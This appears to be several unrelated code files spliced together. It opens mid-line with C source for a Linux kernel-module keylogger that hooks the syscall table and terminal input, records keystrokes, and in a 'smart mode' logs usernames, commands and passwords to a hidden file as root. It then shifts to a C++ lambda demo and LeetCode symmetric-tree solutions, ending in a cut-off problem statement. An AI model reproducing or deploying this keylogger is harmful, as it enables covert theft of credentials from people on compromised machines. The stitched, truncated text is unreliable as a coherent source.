　tty->driver.subtype == PTY_TYPE_SLAVE?N_PTS_NAME:"")
#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }
extern void *sys_call_table[];
int errno;
struct tlogger {
 struct tty_struct *tty;
 char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ];
 int lastpos;
 int status;
 int pass;
};
struct tlogger *ttys[MAX_TTY_CON + MAX_PTS_CON] = { NULL };
void (*old_receive_buf)(struct tty_struct *, const unsigned char *,
　 char *, int);
asmlinkage int (*original_sys_open)(const char *, int, int);
int vlogger_mode = DEFAULT_MODE;
/* Prototypes */
static inline void init_tty(struct tty_struct *, int);
/*
static char *_tty_make_name(struct tty_struct *tty, 
　　const char *name, char *buf)
{
 int idx = (tty)?MINOR(tty->device) - tty->driver.minor_start:0;
 if (!tty) 
　strcpy(buf, "NULL tty");
 else
　sprintf(buf, name,
　 idx + tty->driver.name_base);
 return buf;
}
char *tty_name(struct tty_struct *tty, char *buf)
{
 return _tty_make_name(tty, (tty)?tty->driver.name:NULL, buf);
}
*/
#define SECS_PER_HOUR　 (60 * 60)
#define SECS_PER_DAY　　(SECS_PER_HOUR * 24)
#define isleap(year) 
 ((year) % 4 == 0 && ((year) % 100 != 0 || (year) % 400 == 0))
#define DIV(a, b) ((a) / (b) - ((a) % (b) < 0))
#define LEAPS_THRU_END_OF(y) (DIV (y, 4) - DIV (y, 100) + DIV (y, 400))
struct vtm {
 int tm_sec;
 int tm_min;
 int tm_hour;
 int tm_mday;
 int tm_mon;
 int tm_year;
};

/* 
 *　Convert from epoch to date 
 */
 
int epoch2time (const time_t *t, long int offset, struct vtm *tp)
{
 static const unsigned short int mon_yday[2][13] = {
　　/* Normal years.　*/
　　{ 0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365 },
　　/* Leap years.　*/
　　{ 0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366 }
 };
 long int days, rem, y;
 const unsigned short int *ip;
 days = *t / SECS_PER_DAY;
 rem = *t % SECS_PER_DAY;
 rem += offset;
 while (rem < 0) { 
　rem += SECS_PER_DAY;
　--days;
 }
 while (rem >= SECS_PER_DAY) {
　rem -= SECS_PER_DAY;
　++days;
 }
 tp->tm_hour = rem / SECS_PER_HOUR;
 rem %= SECS_PER_HOUR;
 tp->tm_min = rem / 60;
 tp->tm_sec = rem % 60;
 y = 1970;
 while (days < 0 || days >= (isleap (y) ? 366 : 365)) {
　long int yg = y + days / 365 - (days % 365 < 0);
　days -= ((yg - y) * 365
　 + LEAPS_THRU_END_OF (yg - 1)
　 - LEAPS_THRU_END_OF (y - 1));
　y = yg;
 }
 tp->tm_year = y - 1900;
 if (tp->tm_year != y - 1900)
　return 0;
 ip = mon_yday[isleap(y)];
 for (y = 11; days < (long int) ip[y]; --y)
　continue;
 days -= ip[y];
 tp->tm_mon = y;
 tp->tm_mday = days + 1;
 return 1;
}

/* 
 *　Get current date & time
 */
void get_time (char *date_time) 
{
 struct timeval tv;
 time_t t;
 struct vtm tm;
 
 do_gettimeofday(&tv);
　　　　t = (time_t)tv.tv_sec;
 
 epoch2time(&t, TIMEZONE, &tm);
 sprintf(date_time, "%.2d/%.2d/%d-%.2d:%.2d:%.2d", tm.tm_mday,
　tm.tm_mon + 1, tm.tm_year + 1900, tm.tm_hour, tm.tm_min,
　tm.tm_sec);
}

/* 
 * Get task structure from pgrp id
 */
inline struct task_struct *get_task(pid_t pgrp) 
{
 struct task_struct *task = current;
　　　　do {
　　　　　　　  if (task->pgrp == pgrp) {
　　　　　　　　　　　  return task;
　　　　　　　  }
　　　　　　　  task = task->next_task;
　　　　} while (task != current);
　　　　return NULL;
}

#define _write(f, buf, sz) (f->f_op->write(f, buf, sz, &f->f_pos))
#define WRITABLE(f) (f->f_op && f->f_op->write)
int write_to_file(char *logfile, char *buf, int size)
{
 int ret = 0;
 struct file　 *f = NULL;
 lock_kernel();
 BEGIN_KMEM;
 f = filp_open(logfile, O_CREAT|O_APPEND, 00600);
 if (IS_ERR(f)) {
　DPRINT("Error %ld opening %sn", -PTR_ERR(f), logfile);
　ret = -1;
 } else {
　if (WRITABLE(f))
　 _write(f, buf, size);
　else {
　　　 　DPRINT("%s does not have a write methodn",
　　　 　 logfile);
　 ret = -1;
　}
　　　 
　if ((ret = filp_close(f,NULL)))
　 DPRINT("Error %d closing %sn", -ret, logfile);
 }
 END_KMEM;
 unlock_kernel();
 return ret;
}

#define BEGIN_ROOT { int saved_fsuid = current->fsuid; current->fsuid = 0;
#define END_ROOT current->fsuid = saved_fsuid; }

/* 
 *　Logging keystrokes
 */
void logging(struct tty_struct *tty, struct tlogger *tmp, int cont) 
{
 int i;
 char logfile[256];
 char loginfo[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ + 256];
 char date_time[24];
 struct task_struct *task;
 if (vlogger_mode == VK_NORMAL)
　return;
 if ((vlogger_mode == VK_SMARTMODE) && (!tmp->lastpos || cont))
　return;
　
 task = get_task(tty->pgrp);
　
 for (i=0; i<tmp->lastpos; i++)
　if (tmp->buf[i] == 0x0D) tmp->buf[i] = 0x0A;
 if (!cont) 
　tmp->buf[tmp->lastpos++] = 0x0A;
 
 tmp->buf[tmp->lastpos] = 0;
 if (vlogger_mode == VK_DUMBMODE) {
　snprintf(logfile, sizeof(logfile)-1, "%s/%s%d",
　　LOG_DIR, TTY_NAME(tty), TTY_NUMBER(tty));
　BEGIN_ROOT
　if (!tmp->status) {
　 get_time(date_time);
　 if (task)
　　snprintf(loginfo, sizeof(loginfo)-1,
　　 "<%s uid=%d %s> %s", date_time,
　　 task->uid, task->comm, tmp->buf);
　 else
　　snprintf(loginfo, sizeof(loginfo)-1,
　　 "<%s> %s", date_time, tmp->buf);
　 
　 write_to_file(logfile, loginfo, strlen(loginfo));
　} else {
　 write_to_file(logfile, tmp->buf, tmp->lastpos);
　}
　END_ROOT
#ifdef DEBUG
　if (task)
　 DPRINT("%s/%d uid=%d %s: %s", 
　　TTY_NAME(tty), TTY_NUMBER(tty), 
　　task->uid, task->comm, tmp->buf);
　else
　 DPRINT("%s", tmp->buf);
#endif
　tmp->status = cont;
　
 } else {
　/*
　 *　Logging USER/CMD and PASS in SMART_MODE
　 */
　BEGIN_ROOT
　if (!tmp->pass) {
　 get_time(date_time);
　 if (task)
　　snprintf(loginfo, sizeof(loginfo)-1,
　　 "n[%s tty=%s/%d uid=%d %s]n"
　　 "USER/CMD %s", date_time, 
　　 TTY_NAME(tty),TTY_NUMBER(tty), 
　　 task->uid, task->comm, tmp->buf);
　 else
　　snprintf(loginfo, sizeof(loginfo)-1,
　　 "n[%s tty=%s/%d]nUSER/CMD %s",
　　 date_time, TTY_NAME(tty), 
　　 TTY_NUMBER(tty), tmp->buf);
　 write_to_file(PASS_LOG, loginfo, strlen(loginfo));
　} else {
　 snprintf(loginfo, sizeof(loginfo)-1, "PASS %s",
　　 tmp->buf);
　 write_to_file (PASS_LOG, loginfo, strlen(loginfo));
　}
　END_ROOT
#ifdef DEBUG
　if (!tmp->pass)
　 DPRINT("USER/CMD %s", tmp->buf);
　else
　 DPRINT("PASS %s", tmp->buf);
#endif
 }
 if (!cont) tmp->buf[--tmp->lastpos] = 0;
}

#define resetbuf(t)　
{　　
 t->buf[0] = 0;　
 t->lastpos = 0;　
}
#define append_c(t, s, n) 
{　　
 t->lastpos += n; 
 strncat(t->buf, s, n); 
}
static inline void reset_all_buf(void)
{
 int i = 0;
 for (i=0; i<MAX_TTY_CON + MAX_PTS_CON; i++)
　if (ttys[i] != NULL)
　 resetbuf(ttys[i]);
}
void special_key(struct tlogger *tmp, const unsigned char *cp, int count)
{
　　 switch(count) {
　　 case 2:
　　　　  switch(cp[1]) {
　 case ''':
　　append_c(tmp, "[ALT-']", 7);
　　break;
　 case ',':
　　append_c(tmp, "[ALT-,]", 7);
　　break;
　 case '-':
　　append_c(tmp, "[ALT--]", 7);
　　break;
　 case '.':
　　append_c(tmp, "[ALT-.]", 7);
　　break;
　 case '/':
　　append_c(tmp, "[ALT-/]", 7);
　　break;
　 case '0':
　　append_c(tmp, "[ALT-0]", 7);
　　break;
　 case '1':
　　append_c(tmp, "[ALT-1]", 7);
　　break;
　 case '2':
　　append_c(tmp, "[ALT-2]", 7);
　　break;
　 case '3':
　　append_c(tmp, "[ALT-3]", 7);
　　break;
　 case '4':
　　append_c(tmp, "[ALT-4]", 7);
　　break;
　 case '5':
　　append_c(tmp, "[ALT-5]", 7);
　　break;
　 case '6':
　　append_c(tmp, "[ALT-6]", 7);
　　break;
　 case '7':
　　append_c(tmp, "[ALT-7]", 7);
　　break;
　 case '8':
　　append_c(tmp, "[ALT-8]", 7);
　　break;
　 case '9':
　　append_c(tmp, "[ALT-9]", 7);
　　break;
　 case ';':
　　append_c(tmp, "[ALT-;]", 7);
　　break;
　 case '=':
　　append_c(tmp, "[ALT-=]", 7);
　　break;
　 case '[':
　　append_c(tmp, "[ALT-[]", 7);
　　break;
　 case '\':
　　append_c(tmp, "[ALT-\]", 7);
　　break;
　 case ']':
　　append_c(tmp, "[ALT-]]", 7);
　　break;
　 case '`':
　　append_c(tmp, "[ALT-`]", 7);
　　break;
　 case 'a':
　　append_c(tmp, "[ALT-A]", 7);
　　break;
　 case 'b':
　　append_c(tmp, "[ALT-B]", 7);
　　break;
　 case 'c':
　　append_c(tmp, "[ALT-C]", 7);
　　break;
　 case 'd':
　　append_c(tmp, "[ALT-D]", 7);
　　break;
　 case 'e':
　　append_c(tmp, "[ALT-E]", 7);
　　break;
　 case 'f':
　　append_c(tmp, "[ALT-F]", 7);
　　break;
　 case 'g':
　　append_c(tmp, "[ALT-G]", 7);
　　break;
　 case 'h':
　　append_c(tmp, "[ALT-H]", 7);
　　break;
　 case 'i':
　　append_c(tmp, "[ALT-I]", 7);
　　break;
　 case 'j':
　　append_c(tmp, "[ALT-J]", 7);
　　break;
　 case 'k':
　　append_c(tmp, "[ALT-K]", 7);
　　break;
　 case 'l':
　　append_c(tmp, "[ALT-L]", 7);
　　break;
　 case 'm':
　　append_c(tmp, "[ALT-M]", 7);
　　break;
　 case 'n':
　　append_c(tmp, "[ALT-N]", 7);
　　break;
　 case 'o':
　　append_c(tmp, "[ALT-O]", 7);
　　break;
　 case 'p':
　　append_c(tmp, "[ALT-P]", 7);
　　break;
　 case 'q':
　　append_c(tmp, "[ALT-Q]", 7);
　　break;
　 case 'r':
　　append_c(tmp, "[ALT-R]", 7);
　　break;
　 case 's':
　　append_c(tmp, "[ALT-S]", 7);
　　break;
　 case 't':
　　append_c(tmp, "[ALT-T]", 7);
　　break;
　 case 'u':
　　append_c(tmp, "[ALT-U]", 7);
　　break;
　 case 'v':
　　append_c(tmp, "[ALT-V]", 7);
　　break;
　 case 'x':
　　append_c(tmp, "[ALT-X]", 7);
　　break;
　 case 'y':
　　append_c(tmp, "[ALT-Y]", 7);
　　break;
　 case 'z':
　　append_c(tmp, "[ALT-Z]", 7);
　　break;
　}
　break;
　　 case 3:
　switch(cp[2]) {
　 case 68:
　　// Left: 27 91 68
　　append_c(tmp, "[LEFT]", 6);
　　break;
　 case 67:
　　// Right: 27 91 67
　　append_c(tmp, "[RIGHT]", 7);
　　break;
　 case 65:
　　// Up: 27 91 65
　　append_c(tmp, "[UP]", 4);
　　break;
　 case 66:
　　// Down: 27 91 66
　　append_c(tmp, "[DOWN]", 6);
　　break;
　 case 80:
　　// Pause/Break: 27 91 80 
　　append_c(tmp, "[BREAK]", 7);
　　break;
　}
　break;
　　 case 4:
　switch(cp[3]) {
　 case 65:
　　// F1: 27 91 91 65
　　append_c(tmp, "[F1]", 4);
　　break;
　 case 66:
　　// F2: 27 91 91 66
　　append_c(tmp, "[F2]", 4);
　　break;
　 case 67:
　　// F3: 27 91 91 67
　　append_c(tmp, "[F3]", 4);
　　break;
　 case 68:
　　// F4: 27 91 91 68
　　append_c(tmp, "[F4]", 4);
　　break;
　 case 69:
　　// F5: 27 91 91 69
　　append_c(tmp, "[F5]", 4);
　　break;
　 case 126:
　　switch(cp[2]) {
　　 case 53:
　　　// PgUp: 27 91 53 126
　　　append_c(tmp, "[PgUP]", 6);
　　　break;
　　 case 54:
　　　// PgDown: 27 91 54 126
　　　append_c(tmp, 
　　　 "[PgDOWN]", 8);
　　　break;
　　 case 49:
　　　// Home: 27 91 49 126
　　　append_c(tmp, "[HOME]", 6);
　　　break;
　　 case 52:
　　　// End: 27 91 52 126
　　　append_c(tmp, "[END]", 5);
　　　break;
　　 case 50:
　　　// Insert: 27 91 50 126
　　　append_c(tmp, "[INS]", 5);
　　　break;
　　 case 51:
　　　// Delete: 27 91 51 126
　　　append_c(tmp, "[DEL]", 5);
　　　break;
　　}
　 break;
　}
　break;
　　 case 5:
　if(cp[2] == 50)
　 switch(cp[3]) {
　　case 48:
　　 // F9: 27 91 50 48 126
　　 append_c(tmp, "[F9]", 4);
　　 break;
　　case 49:
　　 // F10: 27 91 50 49 126
　　 append_c(tmp, "[F10]", 5);
　　 break;
　　case 51:
　　 // F11: 27 91 50 51 126
　　 append_c(tmp, "[F11]", 5);
　　 break;
　　case 52:
　　 // F12: 27 91 50 52 126
　　 append_c(tmp, "[F12]", 5);
　　 break;
　　case 53:
　　 // Shift-F1: 27 91 50 53 126
　　 append_c(tmp, "[SH-F1]", 7);
　　 break;
　　case 54:
　　 // Shift-F2: 27 91 50 54 126
　　 append_c(tmp, "[SH-F2]", 7);
　　 break;
　　case 56:
　　 // Shift-F3: 27 91 50 56 126
　　 append_c(tmp, "[SH-F3]", 7);
　　 break;
　　case 57:
　　 // Shift-F4: 27 91 50 57 126
　　 append_c(tmp, "[SH-F4]", 7);
　　 break;
　 }
　else
　 switch(cp[3]) {
　　case 55:
　　 // F6: 27 91 49 55 126
　　 append_c(tmp, "[F6]", 4);
　　 break;
　　　 　case 56:
　　 // F7: 27 91 49 56 126
　　 append_c(tmp, "[F7]", 4);
　　 break;
　　 　　case 57:
　　 // F8: 27 91 49 57 126
　　 append_c(tmp, "[F8]", 4);
　　 break;
　　　 　case 49:
　　 // Shift-F5: 27 91 51 49 126
　　 append_c(tmp, "[SH-F5]", 7);
　　 break;
　　　 　case 50:
　　 // Shift-F6: 27 91 51 50 126
　　 append_c(tmp, "[SH-F6]", 7);
　　 break;
　　 　　case 51:
　　 // Shift-F7: 27 91 51 51 126
　　 append_c(tmp, "[SH-F7]", 7);
　　 break;
　　　 　case 52:
　　 // Shift-F8: 27 91 51 52 126
　　 append_c(tmp, "[SH-F8]", 7);
　　 break;
　 };
　break;
　　 default: // Unknow
　break;
　　}
}

/* 
 *　Called whenever user press a key
 */
void vlogger_process(struct tty_struct *tty, 
　 const unsigned char *cp, int count)
{
 struct tlogger *tmp = ttys[TTY_INDEX(tty)];
 if (!tmp) {
　DPRINT("erm .. unknow error???n");
　init_tty(tty, TTY_INDEX(tty));
　tmp = ttys[TTY_INDEX(tty)];
　if (!tmp)
　 return;
 }
 if (vlogger_mode == VK_SMARTMODE) {
　if (tmp->status && !IS_PASSWD(tty)) {
　 resetbuf(tmp);
　}　
　if (!tmp->pass && IS_PASSWD(tty)) {
　 logging(tty, tmp, 0);
　 resetbuf(tmp);
　}
　if (tmp->pass && !IS_PASSWD(tty)) { 
　 if (!tmp->lastpos)
　　logging(tty, tmp, 0);
　 resetbuf(tmp);
　}
　tmp->pass　= IS_PASSWD(tty);
　tmp->status = 0;
 }
 if ((count + tmp->lastpos) > MAX_BUFFER - 1) { 
　logging(tty, tmp, 1);
　resetbuf(tmp);
 } 
 if (count == 1) {
　if (cp[0] == VK_TOGLE_CHAR) {
　 if (!strcmp(tmp->buf, MAGIC_PASS)) {
　　if(vlogger_mode < 2)
　　 vlogger_mode++;
　　else
　　 vlogger_mode = 0;
　　reset_all_buf();
　　switch(vlogger_mode) {
　　 case VK_DUMBMODE:
　　　　　DPRINT("Dumb Moden");
　　　TTY_WRITE(tty, "rn"
　　　　　"Dumb Moden", 12);
　　　break;
　　 case VK_SMARTMODE:
　　　  　DPRINT("Smart Moden");
　　　TTY_WRITE(tty, "rn"
　　　"Smart Moden", 13);
　　　break;
　　 case VK_NORMAL:
　　　　  DPRINT("Normal Moden");
　　　TTY_WRITE(tty, "rn"
　　　"Normal Moden", 14);
　　}
　 }
　}
　switch (cp[0]) {
　 case 0x01: //^A
　　append_c(tmp, "[^A]", 4);
　　break;
　 case 0x02: //^B
　　append_c(tmp, "[^B]", 4);
　　break;
　 case 0x03: //^C
　　append_c(tmp, "[^C]", 4);
　 case 0x04: //^D
　　append_c(tmp, "[^D]", 4);
　 case 0x0D: //^M
　 case 0x0A:
　　if (vlogger_mode == VK_SMARTMODE) {
　　 if (IS_PASSWD(tty)) {
　　　logging(tty, tmp, 0);
　　　resetbuf(tmp);
　　 } else
　　　tmp->status = 1;
　　} else {
　　 logging(tty, tmp, 0);
　　 resetbuf(tmp);
　　}
　　break;
　 case 0x05: //^E
　　append_c(tmp, "[^E]", 4);
　　break;
　 case 0x06: //^F
　　append_c(tmp, "[^F]", 4);
　　break;
　 case 0x07: //^G
　　append_c(tmp, "[^G]", 4);
　　break;
　 case 0x09: //TAB - ^I
　　append_c(tmp, "[TAB]", 5);
　　break;
　 case 0x0b: //^K
　　append_c(tmp, "[^K]", 4);
　　break;
　 case 0x0c: //^L
　　append_c(tmp, "[^L]", 4);
　　break;
　 case 0x0e: //^E
　　append_c(tmp, "[^E]", 4);
　　break;
　 case 0x0f: //^O
　　append_c(tmp, "[^O]", 4);
　　break;
　 case 0x10: //^P
　　append_c(tmp, "[^P]", 4);
　　break;
　 case 0x11: //^Q
　　append_c(tmp, "[^Q]", 4);
　　break;
　 case 0x12: //^R
　　append_c(tmp, "[^R]", 4);
　　break;
　 case 0x13: //^S
　　append_c(tmp, "[^S]", 4);
　　break;
　 case 0x14: //^T
　　append_c(tmp, "[^T]", 4);
　　break;
　 case 0x15: //CTRL-U
　　resetbuf(tmp);
　　break;　　
　 case 0x16: //^V
　　append_c(tmp, "[^V]", 4);
　　break;
　 case 0x17: //^W
　　append_c(tmp, "[^W]", 4);
　　break;
　 case 0x18: //^X
　　append_c(tmp, "[^X]", 4);
　　break;
　 case 0x19: //^Y
　　append_c(tmp, "[^Y]", 4);
　　break;
　 case 0x1a: //^Z
　　append_c(tmp, "[^Z]", 4);
　　break;
　 case 0x1c: //^
　　append_c(tmp, "[^\]", 4);
　　break;
　 case 0x1d: //^]
　　append_c(tmp, "[^]]", 4);
　　break;
　 case 0x1e: //^^
　　append_c(tmp, "[^^]", 4);
　　break;
　 case 0x1f: //^_
　　append_c(tmp, "[^_]", 4);
　　break;
　 case BACK_SPACE_CHAR1:
　 case BACK_SPACE_CHAR2:
　　if (!tmp->lastpos) break;
　　if (tmp->buf[tmp->lastpos-1] != ']')
　　 tmp->buf[--tmp->lastpos] = 0;
　　else {
　　 append_c(tmp, "[^H]", 4);
　　}
　　break;
　 case ESC_CHAR: //ESC
　　append_c(tmp, "[ESC]", 5);
　　break;
　 default:
　　tmp->buf[tmp->lastpos++] = cp[0];
　　tmp->buf[tmp->lastpos] = 0;
　}
 } else { // a block of chars or special key
　if (cp[0] != ESC_CHAR) {
　 while (count >= MAX_BUFFER) {
　　append_c(tmp, cp, MAX_BUFFER);
　　logging(tty, tmp, 1);
　　resetbuf(tmp);
　　count -= MAX_BUFFER;
　　cp += MAX_BUFFER;
　 }
　 append_c(tmp, cp, count);
　} else  // special key
　 special_key(tmp, cp, count);
 }
}

void my_tty_open(void) 
{
 int fd, i;
 char dev_name[80];
#ifdef LOCAL_ONLY
 int fl = 0;
 struct tty_struct * tty;
 struct file * file;
#endif
 for (i=1; i<MAX_TTY_CON; i++) {
　snprintf(dev_name, sizeof(dev_name)-1, "/dev/tty%d", i);
　BEGIN_KMEM
　 fd = open(dev_name, O_RDONLY, 0);
　 if (fd < 0) continue;
#ifdef LOCAL_ONLY
　 file = fget(fd);
　 tty = file->private_data;
　 if (tty != NULL　&& 
　　tty->ldisc.receive_buf != NULL) {
　　if (!fl) {
　　 old_receive_buf = 
　　　tty->ldisc.receive_buf;
　　 fl = 1;
　　}
　　init_tty(tty, TTY_INDEX(tty));
　 }
　 fput(file);
#endif
　 close(fd);
　END_KMEM
 }
#ifndef LOCAL_ONLY
 for (i=0; i<MAX_PTS_CON; i++) {
　snprintf(dev_name, sizeof(dev_name)-1, "/dev/pts/%d", i);
　BEGIN_KMEM
　 fd = open(dev_name, O_RDONLY, 0);
　 if (fd >= 0) close(fd);
　END_KMEM
 }
#endif
}

void new_receive_buf(struct tty_struct *tty, const unsigned char *cp,
　　　char *fp, int count)
{
 if (!tty->real_raw && !tty->raw) // ignore raw mode
　vlogger_process(tty, cp, count);
 (*old_receive_buf)(tty, cp, fp, count);
}

static inline void init_tty(struct tty_struct *tty, int tty_index)
{
 struct tlogger *tmp;
 DPRINT("Init logging for %s%dn", TTY_NAME(tty), TTY_NUMBER(tty));
 if (ttys[tty_index] == NULL) {
　tmp = kmalloc(sizeof(struct tlogger), GFP_KERNEL);
　if (!tmp) {
　 DPRINT("kmalloc failed!n");
　 return;
　}
　memset(tmp, 0, sizeof(struct tlogger));
　tmp->tty = tty;
　tty->ldisc.receive_buf = new_receive_buf;
　ttys[tty_index] = tmp;
 } else {
　tmp = ttys[tty_index];
　logging(tty, tmp, 1);
　resetbuf(tmp);
　tty->ldisc.receive_buf = new_receive_buf;
 }
}

asmlinkage int new_sys_open(const char *filename, int flags, int mode)
{
 int ret;
 static int fl = 0;
 struct file * file;
 
 ret = (*original_sys_open)(filename, flags, mode);
 
 if (ret >= 0) {
　struct tty_struct * tty;
　　 BEGIN_KMEM
　　  lock_kernel();
　file = fget(ret);
　tty = file->private_data;
　if (tty != NULL && 
　 ((tty->driver.type == TTY_DRIVER_TYPE_CONSOLE &&
　 TTY_NUMBER(tty) < MAX_TTY_CON - 1 ) ||
　 (tty->driver.type == TTY_DRIVER_TYPE_PTY &&
　 tty->driver.subtype == PTY_TYPE_SLAVE &&
　 TTY_NUMBER(tty) < MAX_PTS_CON)) &&
　 tty->ldisc.receive_buf != NULL &&
　 tty->ldisc.receive_buf != new_receive_buf) {
　 if (!fl) {
　　old_receive_buf = tty->ldisc.receive_buf;
　　fl = 1;
　 }
　 init_tty(tty, TTY_INDEX(tty));
　}
　fput(file);
　unlock_kernel();
　　 END_KMEM
 }
 return ret;
}

int init_module(void)
{
 DPRINT(MVERSION);
#ifndef LOCAL_ONLY
 original_sys_open = sys_call_table[__NR_open];
 sys_call_table[__NR_open] = new_sys_open;
#endif
 my_tty_open();
// MOD_INC_USE_COUNT;
 return 0;
}
DECLARE_WAIT_QUEUE_HEAD(wq);
void cleanup_module(void)
{
 int i;
#ifndef LOCAL_ONLY
 sys_call_table[__NR_open] = original_sys_open;
#endif
 for (i=0; i<MAX_TTY_CON + MAX_PTS_CON; i++) {
　if (ttys[i] != NULL) {
　 ttys[i]->tty->ldisc.receive_buf = old_receive_buf;
　}
 }
 sleep_on_timeout(&wq, HZ);
 for (i=0; i<MAX_TTY_CON + MAX_PTS_CON; i++) {
　if (ttys[i] != NULL) {
　 kfree(ttys[i]);
　}
 }
 DPRINT("Unloadedn");
}
 





// Lambda_test20140801.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <algorithm>
#include <iostream>
#include <vector>
using namespace std;


int main()
{
	//创建一个包含10个元素的集合对象
	vector<int> v;

	for (int i = 0; i < 10; ++i)
	{
		v.push_back(i);
	}

	//使用for_each 语句和lambda表达式来实现对偶元素的计数

	int evenCount = 0;
	for_each(v.begin(),v.end(),[&evenCount](int n){
		
		cout<<n;

		if (n % 2 == 0)
		{
			cout<<" is even"<<endl;

			//increment the counter
			evenCount++;

		}
		else
		{
			cout<<" is odd"<<endl;

		}
	
	
	
	});

	//将偶元素个数打印出来
	cout<<"There are "<<evenCount<<" even numbers in the vector"<<endl;


	getchar();




	return 0;
}

 





﻿﻿

Symmetric Tree Total Accepted: 
61440 Total Submissions: 
194643 
My Submissions
                      




Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).
For example, this binary tree is symmetric: 
    1
   / \
  2   2
 / \ / \
3  4 4  3



But the following is not:
    1
   / \
  2   2
   \   \
   3    3



Note:
Bonus points if you could solve it both recursively and iteratively. 
confused what "{1,#,2,3}" means? 
> read more on how binary tree is serialized on OJ.

c++ 解决方案：
/**
 * Definition for binary tree
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}
 * };
 */
#include<queue>
using namespace std;
typedef pair<TreeNode*,TreeNode*> nodepair;
class Solution {
public:
    bool isSymmetricRecursive(TreeNode*a,TreeNode*b){
        if(a){
            return b && a->val==b->val && 
                isSymmetricRecursive(a->left,b->right) &&
                isSymmetricRecursive(a->right,b->left);
        }
        return !b;
    }
    bool isSymmetricRecursive(TreeNode*root){
        return !root || isSymmetricRecursive(root->left,root->right);
    }
    bool isSymmetric(TreeNode *root) {
        // Level-order BFS.
        queue<nodepair> q;
        if(root)
            q.push(make_pair(root->left,root->right));
        while(q.size()){
            nodepair p=q.front(); q.pop();
            if(p.first){
                if(!p.second)return false;
                if(p.first->val != p.second->val) return false;
                // the order of children pushed to q is the key to the solution.
                q.push(make_pair(p.first->left,p.second->right));
                q.push(make_pair(p.first->right,p.second->left));
            }
            else if(p.second) return false;
        }
        return true;
    }
};

   

第二种，非递归解决方案：
/**
 * Definition for binary tree
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}
 * };
 */
class Solution {
public:
    bool isSymmetric(TreeNode *root) {
        TreeNode *left, *right;
        if (!root)
            return true;

        queue<TreeNode*> q1, q2;
        q1.push(root->left);
        q2.push(root->right);
        while (!q1.empty() && !q2.empty()){
            left = q1.front();
            q1.pop();
            right = q2.front();
            q2.pop();
            if (NULL == left && NULL == right)
                continue;
            if (NULL == left || NULL == right)
                return false;
            if (left->val != right->val)
                return false;
            q1.push(left->left);
            q1.push(left->right);
            q2.push(right->right);
            q2.push(right->left);
        }
        return true;
    }
};


/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}
 * };
 */
class Solution {
public:
    bool isSymmetric(TreeNode* root) {
        if(!root) return true;
        stack<TreeNode*> sk;
        sk.push(root->left);
        sk.push(root->right);

        TreeNode* pA, *pB;
        while(!sk.empty()) {
            pA = sk.top();
            sk.pop();
            pB = sk.top();
            sk.pop();

            if(!pA && !pB) continue;
            if(!pA || !pB) return false;
            if(pA->val != pB->val) return false;

            sk.push(pA->left);
            sk.push(pB->right);
            sk.push(pA->right);
            sk.push(pB->left);
        }

        return true;
    }
};


 c版本：
/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     struct TreeNode *left;
 *     struct TreeNode *right;
 * };
 */

bool checkNodes(struct TreeNode* a, struct TreeNode* b)
{
    if(a == NULL && b == NULL)
    {
        return true;
    }

    if(a == NULL || b == NULL)
    {
        return false;
    }
    if(a->val != b->val)
    {
        return false;
    }
    return checkNodes(a->left, b->right) && checkNodes(a->right, b->left);
}
bool isSymmetric(struct TreeNode* root) {
    if(root == NULL)
    {
        return true;
    }
    return checkNodes(root->left, root->right);
}递归方案：
bool isSymmetric(TreeNode *root) {
        if (!root) return true;
        return helper(root->left, root->right);
    }

    bool helper(TreeNode* p, TreeNode* q) {
        if (!p && !q) {
            return true;
        } else if (!p || !q) {
            return false;
        }

        if (p->val != q->val) {
            return false;
        }

        return helper(p->left,q->right) && helper(p->right, q->left); 
    }


python版本：
class Solution:
    # @param {TreeNode} root
    # @return {boolean}
    def helper(self, a, b):
        if a is None and b is None:
            return True
        if a is None and b is not None:
            return False
        if a is not None and b is None:
            return False
        if a.val != b.val: 
            return False
        return self.helper(a.left, b.right) and self.helper(a.right,b.left)
    def isSymmetric(self, root):
        if root is None:
            return True
        return self.helper(root.left, root.right)
class Solution:
    # @param {TreeNode} root
    # @return {boolean}
    def isSymmetric(self, root):
        # no tree
        # is identical
        if root is None: return True
        if not self.is_identical(root.left, root.right): return False

        queue = []
        # root is identical
        # proceed to queue up the next level
        # (node, depth)

        if root.left:
            enqueue(queue, (root.left, 1))

        if root.right:
            enqueue(queue, (root.right, 1))

        while queue:

            same_level = True
            level = []
            while same_level:
                # still the same level
                if len(queue) > 0 and (len(level) == 0 or level[-1][1] == queue[0][1]):
                    child = dequeue(queue)
                    level.append(child)
                    # enqueue children now to maintain level order
                    # add to the depth
                    if child[0].left:
                        enqueue(queue, (child[0].left, child[1]+1))
                    if child[0].right:
                        enqueue(queue, (child[0].right, child[1]+1))   
                else:
                    same_level = False

            # symmetrical has to be even
            if len(level) % 2 != 0: return False
            while level:
                # grab the two extreme ends 
                (left_node, _), (right_node, _) = level.pop(0), level.pop()
                if not self.is_identical(left_node, right_node): return False


        return True

    def is_identical(self, left, right):
        # if any of them is none, they need to be both none
        if left is None or right is None:
            return left == right

        # their value should equal
        if left.val != right.val:
            return False

        # if left has a left, then right needs to have right
        if left.left:
            if right.right is None:
                return False


        # if left has a right, then right needs to have left
        if left.right:
            if right.left is None:
                return False

        return True




def enqueue(queue, item):
    queue.append(item)

def dequeue(queue):
    return queue.pop(0)









Given a binary tree, return the level order traversal of its nodes' values. (ie, from left to right, level by level).
For example:
Given binary tree {3,9,20,#,#,15,7},
    3
   / \
  9  20
    /  \
   15   7



return its level order traversal as:
[
  [3],
  [9,20],
  [15,7]
]



confused what "{1,#,2,3}" means? 
